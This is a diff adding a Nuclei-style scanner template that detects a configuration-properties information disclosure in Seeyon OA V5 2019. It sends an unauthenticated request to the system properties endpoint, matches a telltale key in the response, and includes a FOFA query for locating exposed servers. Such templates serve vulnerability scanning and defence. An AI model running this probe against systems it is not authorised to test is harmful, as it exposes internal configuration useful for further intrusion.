@@ -1,0 +1,30 @@
+id: seeyon-properties-disclosure
+info:
+  name: 致远 OA V5 2019 properties - disclosure
+  author: leadlife
+  severity: high
+  description: 致远OAV52019系统properties信息泄露漏洞
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="致远互联-OA"
+  tags: seeyon,disclosure,oa
+
+http:
+  - raw:
+      - |
+        GET /seeyon/rest/m3/common/system/properties HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "officeTrans.rmi.host"
+        condition: and
+
+      - type: status
+        status:
+          - 200
